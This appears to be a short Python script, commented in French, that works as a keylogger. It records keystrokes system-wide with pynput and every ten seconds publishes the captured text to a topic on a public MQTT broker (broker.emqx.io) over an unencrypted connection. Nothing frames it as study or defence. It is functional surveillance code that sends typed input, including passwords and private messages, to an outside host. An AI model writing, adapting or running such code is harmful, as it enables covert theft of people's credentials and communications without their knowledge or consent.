import threading
import time
from pynput import keyboard
import paho.mqtt.client as mqtt

# Variables globales
mot_courant = ""
texte_sauvegarde = ""  # Le str qui stocke l'historique toutes les 5 secondes
verrou = threading.Lock()
TOPIC = "mon_projet_12345/texte"

def capturer_touche(key):
    global mot_courant

    caractere = ""

    if hasattr(key, "char") and key.char is not None:
        caractere = key.char
    else:
        k = str(key)
        if k == "Key.space":
            caractere = " "
        elif k == "Key.enter":
            caractere = "\n"
        elif k == "Key.backspace":
            with verrou:
                mot_courant = mot_courant[:-1]
            return

    if caractere:
        with verrou:
            mot_courant += caractere
            
def on_connect(client, userdata, flags, reason_code, properties):
    print("Connecté, code :", reason_code)
    client.subscribe(TOPIC)

def on_message(client, userdata, msg):
    global texte_sauvegarde
    texte_sauvegarde = msg.payload.decode()
    print(f"{texte_sauvegarde}")

def sauvegarder_periodiquement():
    global mot_courant, texte_sauvegarde

    while True:
        time.sleep(10)
        with verrou:
            if mot_courant:
                # Ajoute le contenu accumulé au str global et vide le mot courant
                texte_sauvegarde += mot_courant
                client.publish(TOPIC + "/sauvegarde", texte_sauvegarde)
                mot_courant = ""
                texte_sauvegarde = ""


client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
client.on_connect = on_connect
client.on_message = on_message
client.connect("broker.emqx.io", 1883)
client.loop_start()

# Lance la sauvegarde toutes les 5 secondes en arrière-plan
thread_sauvegarde = threading.Thread(target=sauvegarder_periodiquement, daemon=True)
thread_sauvegarde.start()

# Lance l'écouteur de clavier
with keyboard.Listener(on_press=capturer_touche) as listener:
    listener.join()